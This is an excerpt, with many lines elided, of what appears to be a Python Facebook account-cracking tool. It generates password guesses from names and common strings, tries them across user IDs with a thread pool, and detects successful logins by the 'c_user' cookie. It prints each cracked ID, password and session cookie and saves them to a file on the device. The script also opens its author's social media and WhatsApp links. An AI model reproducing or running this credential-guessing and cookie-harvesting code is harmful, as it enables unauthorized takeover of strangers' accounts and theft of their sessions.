...
for ua in range(5000):
	...
	ugen.append(alhaj)
os.system("xdg-open https://www.facebook.com/m.shantoboss")
# LOGO
logo = ("""
...
def Main():
        ...
        if Alhaj in ["1","01"]:
            sexy()
        if Alhaj in ["2","02"]:
        	os.system('xdg-open https://wa.me/+8801889146922')
        if Alhaj in [" 0", "00"]:
            exit()
        else:
            exit()     
def sexy():
    ...
    with ThreadPool(max_workers=30) as asha:
        ...
        for love in user:
            ...
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','113355','I love you','Bangladesh']
            asha.submit(alh4aj,uid,pwx,tl)
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [❣️] OK H-SHANTO-OK.txt')
    print(' [❣️] CP H-SHANTO-OK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alh4aj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[SHANTO]\033[1;36m😍[%s/%s]😁\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mH-SHANTO-OK 😝\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                print(f"\033[1;92m[😜] COOKIE :\033[1;95m {coki}")
                print(f"\033[1;33m[\033[1;32mSHANTO-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/H-SHANTO-OK.txt', 'a').write(f'{uid} | {ps}\n {coki} \n')
                oks.append(uid)
                break
            else:
                continue
